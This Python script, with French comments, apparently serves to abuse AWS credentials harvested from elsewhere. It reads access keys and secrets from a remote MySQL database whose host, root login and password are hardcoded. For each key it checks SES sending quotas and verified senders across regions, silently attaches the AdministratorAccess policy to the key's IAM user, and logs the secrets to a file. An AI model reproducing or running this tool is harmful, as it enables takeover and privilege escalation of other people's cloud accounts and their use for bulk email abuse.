import boto3
from botocore.exceptions import ClientError
from rich.console import Console
import pymysql
import concurrent.futures

console = Console()

# Liste des régions AWS où SES est disponible
regions = [
    "us-east-1", "us-west-1", "us-west-2", "eu-west-1",
    "eu-central-1", "ap-southeast-1", "ap-southeast-2",
    "ap-northeast-1", "ap-northeast-2", "sa-east-1"
]

def attach_admin_policy(iam_client, user_name):
    try:
        iam_client.attach_user_policy(
            UserName=user_name,
            PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
        )
        console.print(f"✅ [green]Politique d'administrateur attachée avec succès à l'utilisateur {user_name}[/green]")
    except ClientError as e:
        console.print(f"❌ [red]Erreur lors de l'attachement de la politique d'administrateur à l'utilisateur {user_name}: {e}[/red]")

def test_aws_ses_config(region, access_key_id, secret_access_key):
    try:
        client = boto3.client(
            'ses',
            region_name=region,
            aws_access_key_id=access_key_id,
            aws_secret_access_key=secret_access_key
        )
        # Obtenir le quota d'envoi
        quota_response = client.get_send_quota()
        max_24_hour_send = quota_response['Max24HourSend']
        max_send_rate = quota_response['MaxSendRate']

        console.print(f"🔍 [yellow]Région: {region}, Max24HourSend: {max_24_hour_send}, MaxSendRate: {max_send_rate}[/yellow]")
        
        # Lister les expéditeurs vérifiés
        identities_response = client.list_identities(IdentityType='EmailAddress')
        verified_senders = identities_response['Identities']
        
        result = {
            "region": region,
            "access_key_id": access_key_id,
            "secret_access_key": secret_access_key,
            "max_24_hour_send": max_24_hour_send,
            "max_send_rate": max_send_rate,
            "verified_senders": verified_senders
        }
        
        # Attacher la politique d'administrateur
        iam_client = boto3.client(
            'iam',
            aws_access_key_id=access_key_id,
            aws_secret_access_key=secret_access_key
        )
        user_name = iam_client.get_user()['User']['UserName']
        attach_admin_policy(iam_client, user_name)
        
        return result
    except ClientError as e:
        console.print(f"❌ [red]Échec de connexion à AWS SES dans la région {region}: {e}[/red]")
        return None

def main():
    # Connexion à la base de données MySQL
    conn = pymysql.connect(
        host='94.156.67.171',  # Remplacez par le nom d'hôte de votre base de données
        user='root',  # Remplacez par votre nom d'utilisateur de base de données
        password='Stupid!Rac00n666',  # Remplacez par votre mot de passe de base de données
        database='rez'  # Remplacez par le nom de votre base de données
    )
    cursor = conn.cursor()
    
    cursor.execute("SELECT api_key, secret FROM aws_keys WHERE processed = 1")
    keys = cursor.fetchall()

    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        future_to_region = {
            executor.submit(test_aws_ses_config, region, access_key_id.strip('\'"'), secret_access_key.strip('\'"')): (region, access_key_id)
            for access_key_id, secret_access_key in keys
            for region in regions
        }

        with open('aws_ses_results.txt', 'w') as f:
            for future in concurrent.futures.as_completed(future_to_region):
                region, access_key_id = future_to_region[future]
                try:
                    result = future.result()
                    if result:
                        f.write(f"Access Key ID: {result['access_key_id']}\n")
                        f.write(f"Secret Access Key: {result['secret_access_key']}\n")
                        f.write(f"Region: {result['region']}\n")
                        f.write(f"Max 24 Hour Send: {result['max_24_hour_send']}\n")
                        f.write(f"Max Send Rate: {result['max_send_rate']}\n")
                        f.write(f"Verified Senders: {', '.join(result['verified_senders'])}\n")
                        f.write("\n----------------------\n")
                except Exception as exc:
                    console.print(f"❌ [red]Échec de connexion à AWS SES dans la région {region} pour la clé {access_key_id}: {exc}[/red]")

    console.print("🏁 [blue]Test des clés AWS SES terminé. Résultats enregistrés dans aws_ses_results.txt[/blue]")

if __name__ == "__main__":
    main()
